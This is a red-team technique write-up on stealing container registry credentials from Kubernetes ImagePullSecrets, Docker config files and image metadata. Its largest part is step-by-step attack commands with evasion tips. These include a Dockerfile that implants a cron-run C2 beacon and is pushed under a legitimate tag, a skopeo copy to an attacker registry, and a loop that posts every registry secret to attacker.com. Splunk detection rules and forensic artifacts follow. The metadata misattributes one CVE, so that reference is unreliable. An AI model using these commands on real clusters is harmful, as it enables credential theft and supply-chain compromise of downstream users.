# CA-TOKEN-014: Container Registry Token Theft

## 1. METADATA

| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-014 |
| **MITRE ATT&CK v18.1** | [T1528 - Steal Application Access Token](https://attack.mitre.org/techniques/T1528/) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID, Azure Container Registry (ACR), Kubernetes, Docker Hub, Quay.io |
| **Severity** | **CRITICAL** |
| **CVE** | N/A (General technique); See CVE-2023-5217 (Docker registry auth bypass) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-08 |
| **Affected Versions** | Kubernetes 1.0+, Docker 1.0+, ACR all versions |
| **Patched In** | N/A (design flaw; requires architectural changes) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

### Concept
Container registry token theft is a **critical credential access technique** where an attacker extracts authentication credentials used to access container image registries (Docker Hub, Azure Container Registry, Quay.io, private registries). These credentials are typically stored in Kubernetes Secrets (type `kubernetes.io/dockerconfigjson`), Docker configuration files (`~/.docker/config.json`), or environment variables. Once obtained, the attacker can authenticate to the registry with the stolen credentials, gaining the ability to pull private container images, push malicious images, delete images, or access image metadata. This enables supply chain attacks, malware distribution, intellectual property theft, and lateral movement to other systems where registry credentials are reused.

### Attack Surface
- **Kubernetes Secrets:** ImagePullSecrets stored in etcd (base64-encoded, often unencrypted)
- **Docker Config Files:** `~/.docker/config.json` mounted in containers or on node filesystems
- **Environment Variables:** Registry credentials stored as pod environment variables
- **Container Image Layers:** Credentials embedded in Dockerfile, build scripts, or entrypoints
- **Azure IMDS:** Managed identity tokens used for ACR authentication (metadata service access)
- **Service Account Tokens:** Linked to registry service accounts or principal identities

### Business Impact
**Supply chain compromise** enabling **unauthorized image deployment, malware distribution, and intellectual property theft**. An attacker with stolen registry credentials can: (1) Pull private images to analyze for vulnerabilities, intellectual property, or secrets; (2) Push malicious images with the same name/tag, causing downstream deployments of compromised code; (3) Delete images, causing service disruption and forcing emergency recovery procedures; (4) Access image metadata (manifests, tags, build info) for reconnaissance; (5) Move laterally using registry credentials to authenticate to other systems (CI/CD, cloud provider APIs). In software supply chain scenarios, malicious image injection affects all consumers of the image registry, making the blast radius potentially unbounded.

### Technical Context
- **Execution Time:** < 1 second (direct secret extraction) to < 30 seconds (layer scanning via Skopeo)
- **Detection Difficulty:** **Medium** (credential usage in registry API logs) to **Very High** (if logs not centralized)
- **Stealth Rating:** **Medium** – Token/credential theft is silent; token usage blends with legitimate image pulls if the credentials are used in normal build/deployment workflows

---

### Operational Risk

| Risk Factor | Assessment | Details |
|---|---|---|
| **Execution Risk** | **MEDIUM-HIGH** | Requires pod execution + RBAC permissions (not guaranteed); easier if credentials already cached on node |
| **Stealth** | **HIGH** | Credential extraction is silent; token usage generates audit events (if enabled) but blends with normal traffic |
| **Reversibility** | **NO** | Leaked credentials cannot be "un-leaked"; only remediation is immediate credential rotation and revocation |
| **Privilege Escalation** | **CRITICAL** | Credentials often belong to service accounts with push/delete permissions; enables supply chain attack |
| **Supply Chain Impact** | **EXTREME** | Stolen credentials can be used to inject malicious images consumed by all downstream users |

---

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.2, 5.3.1 | Minimize access to secrets, use RBAC for secret access |
| **DISA STIG** | V-242415, V-254803 | Registry authentication, image verification |
| **CISA SCuBA** | KBE.SY.2.A | Container image supply chain security |
| **NIST 800-53** | AC-3, IA-2, AC-6, SC-7 | Access control, authentication, least privilege, supply chain protection |
| **GDPR** | Art. 32, 33 | Security of processing, breach notification |
| **DORA** | Art. 9, 19 | ICT security, supply chain security |
| **NIS2** | Art. 21, 23 | Cyber risk management, supply chain management |
| **ISO 27001** | A.9.2.3, A.10.1.1 | Management of privileged access, use of cryptography |
| **ISO 27005** | 8.3.3 | Supply chain risk assessment |

---

## 3. TECHNICAL PREREQUISITES

### Required Privileges
- **Minimum:** Pod execution (RCE) OR service account with `get secrets` RBAC permission
- **For ImagePullSecrets:** Service account with `get` on `secrets` resource in target namespace
- **For ACR Admin Credentials:** Azure subscription access or resource group access
- **For Docker Config.json:** Container filesystem read access OR compromised node

### Required Access
- **Network:** Internal pod-to-pod communication (cluster network)
- **Port Access:** 
  - Kubernetes API Server: `6443` (for secret enumeration)
  - Registry APIs: `443` (HTTPS) or `5000` (local registry)
  - Azure IMDS: `169.254.169.254:80` (for managed identity tokens)

### Supported Versions

| Component | Supported Versions | Notes |
|---|---|---|
| **Kubernetes** | 1.0 - 1.29.0+ | ImagePullSecrets introduced in early K8s versions |
| **Docker** | 1.0 - 27.0+ | docker config.json format stable across versions |
| **ACR (Azure)** | All versions | Admin credentials available since service launch |
| **Skopeo** | 1.0 - 1.14.0+ | Container image inspection; no breaking changes |
| **Crane** | 0.1 - 0.15.0+ | Lightweight image tool; stable API |

### Tools

| Tool | Version | URL | Purpose |
|---|---|---|---|
| **kubectl** | 1.19+ | [https://kubernetes.io/docs/tasks/tools/](https://kubernetes.io/docs/tasks/tools/) | Extract Kubernetes Secrets |
| **Skopeo** | 1.14.0+ | [https://github.com/containers/skopeo](https://github.com/containers/skopeo) | Inspect/copy container images, scan layers |
| **Crane** | 0.15.0+ | [https://github.com/google/go-containerregistry/tree/main/cmd/crane](https://github.com/google/go-containerregistry/tree/main/cmd/crane) | List tags, inspect images, copy without runtime |
| **docker** | 19.03+ | [https://www.docker.com/products/docker-desktop/](https://www.docker.com/products/docker-desktop/) | Extract credentials from containers |
| **base64** | GNU coreutils | Built-in on Linux | Decode base64-encoded secrets |
| **jq** | 1.6+ | [https://stedolan.github.io/jq/](https://stedolan.github.io/jq/) | Parse JSON registry configs |

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### A. Kubernetes ImagePullSecrets Enumeration

#### Step 1: Identify Secrets in Current Namespace

**Objective:** Discover Kubernetes Secrets of type `kubernetes.io/dockerconfigjson` that contain registry credentials

**PowerShell / kubectl Reconnaissance:**
```bash
# List all secrets in current namespace:
kubectl get secrets -o wide

# Filter for docker registry secrets:
kubectl get secrets -o=jsonpath='{range .items[?(@.type=="kubernetes.io/dockerconfigjson")]}{.metadata.name}{"\t"}{.type}{"\t"}{.metadata.namespace}{"\n"}{end}'

# Expected output:
# myregistry-secret    kubernetes.io/dockerconfigjson    default
# acr-credentials      kubernetes.io/dockerconfigjson    kube-system
```

**What to Look For:**
- Secrets with type `kubernetes.io/dockerconfigjson` (registry credentials)
- Secrets with type `kubernetes.io/dockercfg` (older Docker format)
- Secrets in privileged namespaces (`kube-system`, `monitoring`, `logging`)
- Multiple secrets indicating use of multiple registries

**Linux / Bash Reconnaissance:**
```bash
# Inside compromised pod
kubectl get secrets --all-namespaces -o=jsonpath='{range .items[?(@.type=="kubernetes.io/dockerconfigjson")]}{.metadata.namespace}{"\t"}{.metadata.name}{"\n"}{end}'
```

#### Step 2: Extract and Decode Registry Credentials

**Objective:** Retrieve and decode the base64-encoded docker config from the secret

**Command:**
```bash
# Extract the .dockerconfigjson field:
kubectl get secret myregistry-secret -n default -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d

# Expected output (decoded JSON):
{
  "auths": {
    "myregistry.azurecr.io": {
      "username": "myregistry",
      "password": "eyJ...XE=",  # Base64-encoded token
      "email": "admin@company.com",
      "auth": "bXlyZWdpc3RyeTpleUo..."  # Base64 of username:password
    },
    "docker.io": {
      "username": "dockeruser",
      "password": "dckr_pat_...",
      "auth": "ZG9ja2VydXNlcjpkY2tyX3BhdF8..."
    }
  },
  "HttpHeaders": {
    "User-Agent": "Docker-Client/20.10.12 (linux)"
  }
}
```

**What This Means:**
- Multiple registry entries indicate use of Docker Hub, ACR, Quay.io, or private registries
- `password` field contains the authentication token or plain-text password
- `auth` field is base64(username:password) – decoding reveals credentials
- `HttpHeaders` can reveal Docker version or custom user-agents (fingerprinting)

**OpSec & Evasion:**
- **Hide command execution:** Use environment variables instead of command output
- **Avoid logging:** Unset bash history with `unset HISTFILE`
- **Cleanup:** Remove decoded files with `shred` to avoid recovery
- **Detection likelihood:** **HIGH** if audit logging enabled (generates `get` API calls)

**Troubleshooting:**

| Error | Cause | Fix |
|---|---|---|
| `error: secrets "myregistry-secret" not found` | Secret doesn't exist in namespace | List all namespaces; check RBAC permissions |
| `Error: resource type "secrets" is not supported on this cluster` | kubectl not available; RBAC denies access | Escalate to node; use kubelet API instead |
| `Invalid base64` | Secret data is not base64-encoded (rare) | Check if data is already plaintext |

**References & Proofs:**
- [Kubernetes Secrets Documentation](https://kubernetes.io/docs/concepts/configuration/secret/)
- [Docker Config.json Format](https://docs.docker.com/engine/reference/commandline/login/)

---

#### Step 3: Test Registry Access with Stolen Credentials

**Objective:** Verify that extracted credentials work for authenticating to the container registry

**Command:**
```bash
# Decode the registry password:
PASSWORD=$(echo "eyJ...XE=" | base64 -d)

# Test ACR access:
curl -u myregistry:$PASSWORD \
  -I https://myregistry.azurecr.io/v2/

# Expected output (200):
# HTTP/1.1 200 OK
# Docker-Distribution-API-Version: registry/2.0

# Or test with docker login:
echo "$PASSWORD" | docker login -u myregistry --password-stdin myregistry.azurecr.io

# Expected output:
# Login Succeeded
```

**Success Indicators:**
- HTTP 200 or 401 (credentials are valid; just may not have access to specific endpoint)
- `Login Succeeded` message (credentials confirmed working)
- Ability to pull/push images (full compromise confirmed)

---

### B. Docker Config.json on Node/Container Filesystem

#### Step 1: Discover Docker Config Files

**Objective:** Locate docker config files on compromised container or node

**Command (Inside Compromised Container):**
```bash
# Check if docker config exists in home directory:
find / -name "config.json" -path "*docker*" 2>/dev/null

# Common locations:
cat ~/.docker/config.json
cat /root/.docker/config.json
cat /home/*/.docker/config.json

# Check for .dockercfg (older format):
find / -name ".dockercfg" 2>/dev/null
```

**Expected Output:**
```json
{
  "auths": {
    "https://index.docker.io/v1/": {
      "auth": "dXNlcm5hbWU6cGFzc3dvcmQ=",
      "email": "user@example.com"
    }
  },
  "credsStore": "pass",
  "credHelpers": {
    "quay.io": "pass"
  }
}
```

**What to Look For:**
- `auth` field: Base64(username:password)
- `credsStore` field: References to password managers (may require breaking into)
- `credHelpers`: Registry-specific credential storage
- Multiple auth entries: Use of multiple registries

#### Step 2: Decode and Extract Plaintext Credentials

**Command:**
```bash
# Decode auth field:
echo "dXNlcm5hbWU6cGFzc3dvcmQ=" | base64 -d

# Output: username:password

# Use jq to extract all credentials:
cat ~/.docker/config.json | jq '.auths | to_entries[] | {registry: .key, auth: .value.auth}' | while read line; do
  echo "$line" | jq -r '.auth' | base64 -d
done

# Output:
# username1:password1
# username2:password2
# ...
```

---

### C. Container Image Layer Scanning for Embedded Credentials

#### Step 1: List Available Images in Registry

**Objective:** Enumerate container images to identify candidates for credential scanning

**Command (Using Skopeo):**
```bash
# List tags in registry:
skopeo list-tags docker://myregistry.azurecr.io/myapp

# Expected output:
# {
#   "Repository": "myregistry.azurecr.io/myapp",
#   "Tags": [
#     "v1.0.0",
#     "v1.0.1",
#     "v1.1.0",
#     "latest",
#     "dev"
#   ]
# }

# Or using Crane:
crane list myregistry.azurecr.io/myapp
```

#### Step 2: Inspect Image Layers for Secrets

**Objective:** Scan container image layers (each layer is a tarball) for hardcoded credentials

**Command:**
```bash
# Extract and inspect image config:
skopeo inspect docker://myregistry.azurecr.io/myapp:v1.0.0

# Expected output (includes Env, Cmd, etc.):
# {
#   "Name": "myregistry.azurecr.io/myapp",
#   "Config": {
#     "Env": [
#       "REGISTRY_PASSWORD=xyz123!@#",
#       "AWS_ACCESS_KEY_ID=AKIA...",
#       "SLACK_TOKEN=xoxb-..."
#     ],
#     "Cmd": ["/app/start.sh"],
#     ...
#   }
# }

# Extract just Env variables:
skopeo inspect docker://myregistry.azurecr.io/myapp:v1.0.0 | jq '.Config.Env'

# Output:
# [
#   "REGISTRY_PASSWORD=xyz123!@#",
#   "AWS_ACCESS_KEY_ID=AKIA...",
#   ...
# ]
```

**What This Means:**
- Environment variables set during image build are persisted in image config
- Credentials in ENV are visible to anyone who can pull the image
- Dockerfile RUN commands stored in layers (searchable for secrets)

**OpSec & Evasion:**
- **Timing:** Layer inspection is slow; spread requests over time
- **User-Agent:** Use curl/skopeo with generic user-agent
- **Detection likelihood:** **MEDIUM** – registry access logs may flag unusual activity

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Kubernetes ImagePullSecrets Extraction & Registry Compromise

**Supported Versions:** Kubernetes 1.0 - 1.29.0+
**Prerequisites:** Pod execution + RBAC `get secrets` permission

#### Step 1: Enumerate All ImagePullSecrets Across Namespaces

**Objective:** Discover all container registry credentials stored in Kubernetes cluster

**Command:**
```bash
# From pod with RBAC permissions, list all secrets of type dockerconfigjson:
kubectl get secrets -A -o=jsonpath='{range .items[?(@.type=="kubernetes.io/dockerconfigjson")]}{.metadata.namespace}{"\t"}{.metadata.name}{"\n"}{end}'

# Expected output:
# default              myregistry-secret
# kube-system          acr-pull-secret
# monitoring           prometheus-registry-secret
# app-prod             production-registry-creds
# app-prod             artifactory-token
```

**What to Look For:**
- High-privilege namespaces (`kube-system`, `kube-public`) with registry credentials
- Multiple registry credentials (indicates use of multiple registries or providers)
- Named secrets containing `prod`, `production`, `azure`, `acr` (higher-value targets)

---

#### Step 2: Extract Credentials from High-Value Secret

**Objective:** Decode and exfiltrate registry credentials from a production namespace

**Command:**
```bash
# Extract credentials from production secret:
SECRET_DATA=$(kubectl get secret production-registry-creds -n app-prod -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d)

echo "$SECRET_DATA" | jq '.'

# Output:
{
  "auths": {
    "production.azurecr.io": {
      "username": "serviceaccount@prod",
      "password": "0000...PROD_TOKEN...9999",
      "email": "devops@company.com",
      "auth": "c2VydmljZWFjY291bnQ..."
    }
  }
}

# Extract just the password:
PASSWORD=$(echo "$SECRET_DATA" | jq -r '.auths["production.azurecr.io"].password')
USERNAME=$(echo "$SECRET_DATA" | jq -r '.auths["production.azurecr.io"].username')

echo "Username: $USERNAME"
echo "Password: $PASSWORD"
```

**Expected Output:**
```
Username: serviceaccount@prod
Password: 0000eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9eyJqdGkiOiI5OWIyYTgwZS03YmNkLTQwYmQtOTBjOC1hYjcxZWRlZDU5OWEiLCJzdWIiOiI5YzQzM2E4Ny04OWJmLTRlZjItOWUwOC1jOWNjM2FkYWQ4YzEiLCJuYmYiOjE2NzA3NjE3NTQsImlzcyI6Imh0dHBzOi8vZ3VhcmRpYW4uYXp1cmVjci5pbyIsImF1ZCI6Ind3dy5henVyZS5jb20iLCJpYXQiOjE2NzA3NjE3NTQsImV4cCI6MTcwMjI5Nzc1NH19999
```

**What This Means:**
- Token is JWT-based (typical for Azure/Entra ID integration)
- Contains JTI (JWT ID), subject (service account), and expiration
- Valid for ~1 month (standard Azure token TTL)
- Can be used immediately to pull/push images with service account permissions

---

#### Step 3: Authenticate to Registry and List Accessible Images

**Objective:** Use stolen credentials to access private registry and enumerate images

**Command:**
```bash
# Login to registry with stolen credentials:
echo "$PASSWORD" | docker login -u "$USERNAME" --password-stdin production.azurecr.io

# List available images:
curl -u "$USERNAME:$PASSWORD" \
  https://production.azurecr.io/v2/_catalog

# Expected output:
{
  "repositories": [
    "backend-service",
    "frontend-web",
    "payment-processor",
    "admin-panel",
    "data-pipeline",
    ...
  ]
}

# List tags for specific image:
curl -u "$USERNAME:$PASSWORD" \
  https://production.azurecr.io/v2/backend-service/tags/list

# Expected output:
{
  "name": "backend-service",
  "tags": [
    "v2.3.1",
    "v2.3.0",
    "v2.2.9",
    "v2.2.8",
    "latest",
    "main-branch",
    "dev"
  ]
}
```

**What This Means:**
- Attacker now has complete visibility into registry images
- Can pull any image for offline analysis
- Can inspect image layers for embedded credentials
- Can identify deployment targets by image name/tag patterns

---

#### Step 4: Pull Private Images for Analysis & Supply Chain Attack

**Objective:** Extract and analyze private images to identify vulnerabilities or inject malicious code

**Command:**
```bash
# Pull and extract image layers:
docker pull production.azurecr.io/backend-service:v2.3.1

# Extract filesystem from layers:
docker save production.azurecr.io/backend-service:v2.3.1 -o backend-service.tar

# Extract tarball:
mkdir extracted_layers
tar -xf backend-service.tar -C extracted_layers

# Search for credentials in layers:
grep -r "password\|secret\|token\|key\|password" extracted_layers/ | head -20

# Search for source code:
find extracted_layers -name "*.py" -o -name "*.js" -o -name "*.go" | head

# Extract environment variables from image config:
docker inspect production.azurecr.io/backend-service:v2.3.1 | jq '.[0].Config.Env'
```

**Expected Output:**
```
[
  "DATABASE_HOST=db.prod.internal",
  "DATABASE_PASSWORD=super_secret_123",
  "AWS_ACCESS_KEY_ID=AKIA...",
  "AWS_SECRET_ACCESS_KEY=...",
  "SLACK_WEBHOOK=https://hooks.slack.com/services/...",
  "GITHUB_TOKEN=ghp_...",
  ...
]
```

**What This Means:**
- Attacker has extracted database credentials
- AWS keys enable lateral movement to cloud infrastructure
- Slack webhook enables notification manipulation
- GitHub token allows code repository access
- **Supply chain attack ready:** Attacker can push malicious version with same tag

---

#### Step 5: Push Malicious Image for Supply Chain Compromise

**Objective:** Upload malicious image that will be pulled by downstream consumers

**Command:**
```bash
# Create malicious Dockerfile:
cat > Dockerfile.malicious << 'EOF'
FROM production.azurecr.io/backend-service:v2.3.0

# Implant backdoor or exfil logic
RUN echo "*/5 * * * * /var/tmp/c2_beacon" | crontab -

# Copy malicious binary
COPY c2_beacon.elf /var/tmp/c2_beacon
RUN chmod +x /var/tmp/c2_beacon

# Preserve original entrypoint to avoid detection
EOF

# Build image:
docker build -t production.azurecr.io/backend-service:v2.3.1 -f Dockerfile.malicious .

# Push with stolen credentials:
docker login -u "$USERNAME" -p "$PASSWORD" production.azurecr.io
docker push production.azurecr.io/backend-service:v2.3.1

# Expected output:
# The push refers to repository [production.azurecr.io/backend-service]
# v2.3.1: digest: sha256:abc123... size: 4096
```

**What This Means:**
- Malicious image now pushed to registry with legitimate tag
- Next deployment of `v2.3.1` pulls compromised image
- Backdoor is persistent across container restarts
- **Blast radius:** All consumers of this image are compromised

---

### METHOD 2: Skopeo-Based Layer Analysis & Image Cloning

**Supported Versions:** Skopeo 1.0+, Crane 0.1+
**Prerequisites:** Network access to registry, stolen registry credentials

#### Step 1: Inspect Image Layers for Embedded Secrets

**Objective:** Extract and analyze Docker image configuration to find hardcoded credentials

**Command:**
```bash
# Inspect image config (no pulling required):
skopeo inspect --creds username:password \
  docker://production.azurecr.io/backend-service:v2.3.1

# Expected output:
{
  "Name": "production.azurecr.io/backend-service",
  "Digest": "sha256:abc123...",
  "RepoTags": ["v2.3.1", "v2.3.0", "latest"],
  "Created": "2025-12-15T10:30:00Z",
  "Config": {
    "Env": [
      "NODE_ENV=production",
      "DB_HOST=postgres.prod.internal",
      "DB_PASSWORD=SuperSecret123!",
      "REDIS_URL=redis://redis.prod.internal:6379",
      "SENTRY_DSN=https://key@sentry.io/123456",
      "GITHUB_TOKEN=ghp_..."
    ],
    "ExposedPorts": {
      "3000/tcp": {}
    },
    "Volumes": {
      "/data": {}
    }
  },
  "Architecture": "amd64",
  "Os": "linux"
}
```

**What This Means:**
- All environment variables from image build are visible
- Database credentials, API keys, tokens all exposed
- Configuration reveals internal service endpoints
- No pull necessary – credentials are in image metadata

**OpSec & Evasion:**
- **Detection likelihood:** **MEDIUM** – Inspect calls are logged in registry audit logs
- **Timing:** Space out requests to avoid rate limiting
- **Cleanup:** Remove output files containing credentials

---

#### Step 2: Clone Image to Attacker's Registry

**Objective:** Copy compromised image to attacker-controlled registry for later deployment

**Command:**
```bash
# Copy image directly between registries (no local pull):
skopeo copy \
  --src-creds victim_username:victim_password \
  --dest-creds attacker_username:attacker_password \
  docker://production.azurecr.io/backend-service:v2.3.1 \
  docker://attacker.azurecr.io/stolen-images/backend-service:v2.3.1

# Expected output:
# Getting image source signatures
# Copying blob abc123... done
# Copying config def456... done
# Writing manifest to image destination
# Storing signatures

# Verify image was copied:
skopeo list-tags --creds attacker_username:attacker_password \
  docker://attacker.azurecr.io/stolen-images

# Output:
# {
#   "Repository": "attacker.azurecr.io/stolen-images/backend-service",
#   "Tags": ["v2.3.1", ...]
# }
```

**What This Means:**
- Exact copy of production image now in attacker's registry
- Image can be analyzed offline at attacker's leisure
- Malicious image can be created based on stolen image
- Attacker can extract and modify layers for injection

---

### METHOD 3: Docker Config.json Extraction from Node Filesystem

**Supported Versions:** Docker 1.0+, Kubernetes 1.0+
**Prerequisites:** Node filesystem access or privileged pod

#### Step 1: Escalate to Node Access

**Objective:** Gain access to node filesystem where docker config files are stored

**Command (Privileged Pod):**
```bash
# Deploy privileged pod with node volume mount:
kubectl run privileged-dump --image=ubuntu --privileged -it -- /bin/bash

# Inside privileged pod, mount node filesystem:
nsenter -m/proc/1/ns/mnt -- ls -la /root/.docker/

# Or directly access node files (if pod-to-node access available):
mount -o bind / /mnt
cat /mnt/root/.docker/config.json
```

**Alternative: Node Shell Access**
```bash
# If kubectl debug available (Kubernetes 1.18+):
kubectl debug node/aks-pool-12345678-vmss000001 -it --image=ubuntu

# Inside node shell:
cat /root/.docker/config.json
cat ~/.docker/config.json
```

#### Step 2: Extract Registry Credentials from Config

**Command:**
```bash
# Copy docker config to container:
cp /mnt/root/.docker/config.json /tmp/docker-config.json

# Decode all auth entries:
cat /tmp/docker-config.json | jq '.auths | to_entries[] | "\(.key): \(.value.auth | @base64d)"'

# Expected output:
# "myregistry.azurecr.io": "serviceaccount@prod:eyJ...XE="
# "docker.io": "dockeruser:dckr_pat_..."
# "quay.io": "quayuser:quay_token_..."
```

---

## 6. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

- **Atomic Test ID:** T1528 (not yet container-registry-specific)
- **Test Name:** Extract Container Registry Credentials
- **Description:** Simulates extraction of Kubernetes ImagePullSecrets containing registry credentials
- **Supported Versions:** Kubernetes 1.19+

**Manual Test Execution:**
```bash
# 1. Create test secret with registry credentials:
kubectl create secret docker-registry test-registry-secret \
  --docker-server=myregistry.azurecr.io \
  --docker-username=testuser \
  --docker-password="testpassword123" \
  --docker-email=test@example.com \
  -n default

# 2. Extract secret:
kubectl get secret test-registry-secret -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d | jq .

# 3. Verify credential extraction:
echo "Extracted credentials:" 
kubectl get secret test-registry-secret -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d | jq '.auths[].username'

# Expected result: Test username displayed
```

**Cleanup Command:**
```bash
kubectl delete secret test-registry-secret -n default
```

---

## 7. TOOLS & COMMANDS REFERENCE

### A. Skopeo – Container Image Inspection & Copying

**Version:** 1.14.0+ (latest 2025)
**Repository:** [GitHub: containers/skopeo](https://github.com/containers/skopeo)
**Language:** Go (single binary)

**Installation:**
```bash
# Linux:
sudo apt-get install skopeo -y

# macOS:
brew install skopeo

# Or build from source:
git clone https://github.com/containers/skopeo
cd skopeo
make
```

**Usage:**
```bash
# Inspect image without pulling:
skopeo inspect docker://quay.io/library/ubuntu:latest

# Copy image with auth:
skopeo copy \
  --src-creds user:pass \
  docker://source-registry/image:tag \
  docker://dest-registry/image:tag

# List tags in repository:
skopeo list-tags docker://quay.io/library/ubuntu

# Sync entire registry:
skopeo sync \
  --src docker \
  --dest dir \
  --src-creds user:pass \
  quay.io/myrepos /mnt/backup
```

---

### B. Crane – Lightweight Image Tool

**Version:** 0.15.0+ (latest 2025)
**Repository:** [GitHub: google/go-containerregistry](https://github.com/google/go-containerregistry)
**Language:** Go

**Installation:**
```bash
# Install latest:
go install github.com/google/go-containerregistry/cmd/crane@latest

# Or download prebuilt:
curl -L https://github.com/google/go-containerregistry/releases/download/v0.15.0/crane-linux-amd64 -o crane
chmod +x crane
```

**Usage:**
```bash
# List tags:
crane list myregistry.azurecr.io/myimage

# Inspect image:
crane config myregistry.azurecr.io/myimage:latest | jq .

# Copy image:
crane cp myregistry.azurecr.io/image:v1 my-registry.local/image:v1

# Pull image as tarball:
crane pull myregistry.azurecr.io/myimage:latest image.tar
```

---

### C. kubectl with RBAC-Based Secret Access

**Usage:**
```bash
# Extract all ImagePullSecrets:
kubectl get secrets -A -o=jsonpath='{range .items[?(@.type=="kubernetes.io/dockerconfigjson")]}{.metadata.namespace}{"\t"}{.metadata.name}{"\n"}{end}'

# Decode specific secret:
kubectl get secret <NAME> -n <NAMESPACE> -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d | jq .

# Test registry access with extracted credentials:
kubectl run -it --rm test-auth --image=alpine --restart=Never -- \
  sh -c 'echo "$PASSWORD" | docker login -u "$USERNAME" --password-stdin myregistry.azurecr.io'
```

---

### D. One-Liner for Credential Extraction

**Quick Registry Credential Exfil:**
```bash
# Extract all ImagePullSecrets and exfil to attacker server:
for secret in $(kubectl get secrets -A -o=jsonpath='{range .items[?(@.type=="kubernetes.io/dockerconfigjson")]}{.metadata.namespace}{","}{.metadata.name}{","}{end}'); do
  NS=$(echo $secret | cut -d, -f1); 
  NAME=$(echo $secret | cut -d, -f2); 
  CREDS=$(kubectl get secret $NAME -n $NS -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d);
  curl -s -X POST -d "namespace=$NS&secret=$NAME&creds=$CREDS" http://attacker.com/exfil;
done
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: ImagePullSecrets Access from Suspicious Pod

**Rule Configuration:**
- **Required Index:** `kube_audit` or `k8s_audit`
- **Required Sourcetype:** `kubernetes:api:audit`
- **Required Fields:** `verb`, `objectRef.resource`, `objectRef.name`, `user`, `sourceIPs`
- **Alert Threshold:** > 1 `get` on secret named `*registry*`, `*docker*`, `*pull*`
- **Applies To Versions:** Kubernetes 1.19+

**SPL Query:**
```spl
index=kube_audit sourcetype=kubernetes:api:audit
  verb=get 
  objectRef.resource=secrets 
  (objectRef.name="*registry*" OR objectRef.name="*docker*" OR objectRef.name="*imagepull*")
  user!=system:*
| stats count, values(sourceIPs), earliest(_time) as first_seen by user, objectRef.namespace, objectRef.name
| where count > 0
| eval risk="HIGH - Registry credential access detected", recommendation="Investigate pod, check RBAC, rotate credentials"
```

---

### Rule 2: Container Registry Authentication Failures

**Rule Configuration:**
- **Required Index:** `container_registry_logs` or `azure_logs`
- **Required Sourcetype:** `docker_registry:api:logs`, `azure:container:registry`
- **Required Fields:** `status_code`, `username`, `ip_address`, `action`
- **Alert Threshold:** > 5 authentication failures in 5 minutes
- **Applies To Versions:** All registry versions

**SPL Query:**
```spl
index=container_registry_logs sourcetype=docker_registry:api:logs
  (status_code=401 OR status_code=403)
  action=pull OR action=push
| stats count, values(username), values(ip_address), earliest(_time) as first_seen by registry_name
| where count > 5
| eval risk="MEDIUM - Possible credential brute force", recommendation="Review failed login patterns, consider IP blocking"
```

---

### Rule 3: Skopeo/Crane Registry Access Pattern

**Rule Configuration:**
- **Required Index:** `container_registry_logs`
- **Required Sourcetype:** `docker_registry:api:logs`
- **Required Fields:** `user_agent`, `verb`, `ip_address`
- **Alert Threshold:** 1 match
- **Applies To Versions:** All

**SPL Query:**
```spl
index=container_registry_logs
  (user_agent="*skopeo*" OR user_agent="*crane*" OR user_agent="*go-containerregistry*")
  OR 
  (user_agent="curl*" AND (request_path="*manifest*" OR request_path="*blobs*"))
| stats count, values(ip_address), values(verb) by user_agent, registry_name
| eval risk="MEDIUM - Advanced registry tool usage detected", recommendation="Verify if legitimate; check IP reputation"
```

---

## 9. FORENSIC ARTIFACTS & LOG LOCATIONS

### A. Kubernetes Audit Log Artifacts

**Location:** `/var/log/pods/kube-system_kube-apiserver-*/kube-apiserver-*_*/kube-apiserver/audit.log`

**Artifacts to Hunt For:**

```json
{
  "level": "RequestResponse",
  "verb": "get",
  "objectRef": {
    "resource": "secrets",
    "namespace": "kube-system",
    "name": "myregistry-credentials",
    "apiVersion": "v1"
  },
  "user": {
    "username": "system:serviceaccount:default:attacker-pod",
    "uid": "12345678-1234-1234-1234-123456789012",
    "groups": ["system:serviceaccounts", "system:authenticated"]
  },
  "sourceIPs": ["10.244.0.1"],
  "responseStatus": {
    "code": 200
  },
  "requestReceivedTimestamp": "2026-01-08T12:00:00.123456Z"
}
```

**IoC Patterns:**
- `verb=get` + `objectRef.resource=secrets` + `objectRef.name="*registry*"`
- `verb=list` + `objectRef.resource=secrets` + multiple results
- Same pod accessing multiple registry secrets in sequence (enumeration)

---

### B. Container Log Artifacts

**Location (Docker):** `/var/lib/docker/containers/<CONTAINER_ID>/*/stdout`

**Forensic Artifacts:**
```bash
# Commands indicating credential theft:
$ kubectl get secrets -A -o jsonpath='...'
$ docker login myregistry.azurecr.io
$ skopeo inspect docker://myregistry.azurecr.io/...
$ crane list myregistry.azurecr.io

# Evidence of image pulling:
$ docker pull myregistry.azurecr.io/backend-service:v2.3.1
$ skopeo copy --src-creds ...
```

---

### C. File System Forensic Artifacts

**Suspicious Files:**
```bash
/tmp/docker-config.json
/tmp/registry-credentials.json
/tmp/k8s-secrets-dump.txt
/tmp/skopeo-*
~/.docker/config.json (if copied from node)
```

**Search Commands:**
```bash
# Find copied config files:
find /tmp -name "*docker*" -o -name "*registry*" -o -name "*config*" 2>/dev/null

# Find shell history with registry commands:
grep -r "docker\|registry\|skopeo\|crane\|kubectl.*secret" ~/.bash_history 2>/dev/null

# Find base64-encoded secrets in memory:
strings /proc/*/mem | grep -E "^[A-Za-z0-9+/]{100,}=$"
```

---

### D. Network Forensic Artifacts

**Registry API Access Pattern:**
- **Source:** Pod IP (10.244.0.0/16)
- **Destination:** Registry FQDN (myregistry.azurecr.io, docker.io, quay.io)
- **Port:** 443 (HTTPS)
- **Payload:** Bearer token in Authorization header (visible in TLS decryption)

**Skopeo/Crane Indicators:**
- Large manifest requests (`.manifests`, `.blobs` endpoints)
- Layer blob downloads
